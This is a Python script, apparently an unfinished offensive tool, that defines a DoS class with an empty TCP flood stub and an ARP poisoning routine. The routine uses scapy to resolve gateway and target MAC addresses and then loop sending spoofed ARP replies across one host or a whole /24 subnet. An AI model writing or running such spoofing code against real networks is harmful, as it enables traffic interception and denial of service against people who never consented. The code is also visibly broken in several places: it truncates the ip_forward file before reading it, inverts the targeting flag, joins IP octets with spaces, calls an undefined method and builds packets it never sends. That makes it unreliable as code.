from scapy.all import *
from termcolor import colored
import os


# FISHT IDEA: PERCH -> Bass -> Pike experience 

class DoS:
    def __init__(self):
        self.target_ip = "10.0.0.4"
        self.target_port = 80


    def flood_tcp(self):
        pass

    def arp_poison(self):
        """
        
        """

        # check if ip forwarding is enabled
        forward_file = "/proc/sys/net/ipv4/ip_forward"
        with open(forward_file, "w+") as f:
            if int(f.readline()) == 1:
                print(colored("[Warning] IP forwarding is enabled. Trying to disable it...", "yellow"))
        
        # check if single attack or entire network
        targeted = False
        i = input("Would you like to target entire network[y/n]")
        if i.lower() == "y":
            router_ip = input("What is the gateway address: ")
            subnet_address = input("What is the subnet mask: 0.0.0.0")
            targeted = True
        if i.lower() == "n":
            router_ip = input("What is the gateway address: ")
            target_ip = input("What is the target address: ")

        # get router and target mac address
        router_packet = ARP(pdst=router_ip)
        target_packet = ARP(pdst=target_ip)

        router_response = sr1(router_packet, timeout=2)
        target_response = sr1(target_packet, timeout=2)
        
        if router_response is None:
            print("Router MAC could not be found")
            self.get_mac()
        elif target_response is None:
            print("Target MAC could not be found")
            self.get_mac()
        else:
            router_mac = router_response.hwsrc
            target_mac = target_response.hwsrc
        
        # send spoofed arp packets
        try:
            while True:
                if targeted:
                    target_arp = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=router_ip, hwdst=target_mac)
                    router_arp = Ether(dst=router_mac)/ARP(op=2, pdst=router_ip, psrc=target_ip, hwdst=router_mac)
                    sendp(target_arp, verbose=False)
                    sendp(router_arp, verbose=False)
                if not targeted:
                    # only programmed for /24 networks currently
                    for i in range(254):
                        split_ip = router_ip.split(".")
                        split_ip[3] = str(i)
                        target_ip = ' '.join(split_ip)
                        target_mac = sr1(ARP(pdst=target_ip)).hwsrc
                        if target_mac == None:
                            print(colored("[Warning] Target did not respond to arp", "yellow"))
                        if target_mac and target_ip is not router_ip:
                            Ether(dst=router_mac)/ARP(op=2, pdst=target_ip, psrc=router_ip, hwdst=target_mac)
                time.sleep(1)
        except:
            pass
